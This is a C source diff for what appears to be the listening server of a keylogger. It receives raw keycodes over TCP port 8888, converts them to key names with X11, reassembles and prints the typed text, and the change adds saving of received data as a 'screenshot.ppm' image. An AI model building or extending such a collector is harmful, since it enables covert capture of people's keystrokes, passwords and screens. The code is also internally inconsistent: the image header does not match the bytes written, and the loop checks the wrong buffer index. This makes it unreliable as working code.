@@ -7,7 +7,7 @@
 #include <X11/Xlib-xcb.h>
 
 #define SERVER_PORT 8888
-#define BUFFER_SIZE 1024
+#define BUFFER_SIZE 4096
 
 void printMessage(char *message, char* color, int omit_date)
 {
@@ -95,57 +95,68 @@ int main()
         // Receive data
         while ((size = recv(client_sockfd, buffer, BUFFER_SIZE, 0)) > 0)
         {
-            // Process received data
-            KeyCode pc = (KeyCode)buffer[0] + 8;
-            Display *dpy = XOpenDisplay(NULL);
-
-            static char received_string[BUFFER_SIZE];
-            static int string_length = 0;
-
-            KeySym keysym = XKeycodeToKeysym(dpy, pc, 0);
-            char *converted = XKeysymToString(keysym);
-
-            // Valid character
-            if (converted != NULL)
+            if (!size) {
+                printMessage("ERROR", "\033[0;33m", 1);
+                break;
+            }
+            // first print received message
+            for (int i = 0; i < size; i++)
             {
-                // If enter pressed, print the received string
-                // if (buffer[0] == 28)
-                // {
-                //     printMessage(received_string, NULL, 0);
-                //     strcpy(received_string, "");
-                //     string_length = 0;
-                // }
-                // else
-                if (buffer[0] == 57)
-                {
-                    strncpy(received_string + string_length, " ", BUFFER_SIZE - string_length - 1);
-                    string_length++;
-                    received_string[string_length] = '\0'; // Add null-terminating character
-                }
-                else if (strlen(converted) == 1)
-                {
-                    // Copy the converted character(s) to the received_string buffer
-                    strncpy(received_string + string_length, converted, BUFFER_SIZE - string_length - 1);
-                    string_length++;
-                    received_string[string_length] = '\0'; // Add null-terminating character
-                }
-                else
-                {
-                    if (strlen(received_string) > 0)
-                    {
-                        printMessage(received_string, NULL, 0);
-                        strcpy(received_string, "");
-                        string_length = 0;
-                    }
+                printf("%c", buffer[i]);
+                // Process received data
+                KeyCode pc = (KeyCode)buffer[i] + 8;
+                Display *dpy = XOpenDisplay(NULL);
 
-                    // Transform converted string to *%s* format
-                    char converted_string[BUFFER_SIZE];
-                    sprintf(converted_string, "*%s*", converted);
-                    printMessage(converted_string, "\033[0;34m", 0);
+                static char received_string[BUFFER_SIZE];
+                static int string_length = 0;
+
+                KeySym keysym = XKeycodeToKeysym(dpy, pc, 0);
+                char *converted = XKeysymToString(keysym);
+
+                // Valid character
+                if (converted != NULL)
+                {
+                    if (buffer[0] == 57)
+                    {
+                        strncpy(received_string + string_length, " ", BUFFER_SIZE - string_length - 1);
+                        string_length++;
+                        received_string[string_length] = '\0'; // Add null-terminating character
+                    }
+                    else if (strlen(converted) == 1)
+                    {
+                        // Copy the converted character(s) to the received_string buffer
+                        strncpy(received_string + string_length, converted, BUFFER_SIZE - string_length - 1);
+                        string_length++;
+                        received_string[string_length] = '\0'; // Add null-terminating character
+                    }
+                    else
+                    {
+                        if (strlen(received_string) > 0)
+                        {
+                            printMessage(received_string, NULL, 0);
+                            strcpy(received_string, "");
+                            string_length = 0;
+                        }
+
+                        // Transform converted string to *%s* format
+                        char converted_string[BUFFER_SIZE];
+                        sprintf(converted_string, "*%s*", converted);
+                        printMessage(converted_string, "\033[0;34m", 0);
+                    }
                 }
+
+                XCloseDisplay(dpy);
             }
 
-            XCloseDisplay(dpy);
+            // save ppm file (starts at half of the buffer)
+            FILE *fp;
+            fp = fopen("screenshot.ppm", "wb");
+            // write bin "P6\n"
+            const char *ppm_header = "P6\n1920 960\n255\n";
+            fwrite(ppm_header, 1, strlen(ppm_header), fp);
+            fwrite(buffer + BUFFER_SIZE / 2, 1, BUFFER_SIZE / 2, fp);
+
+            fclose(fp);
         }
 
         if (size < 0)
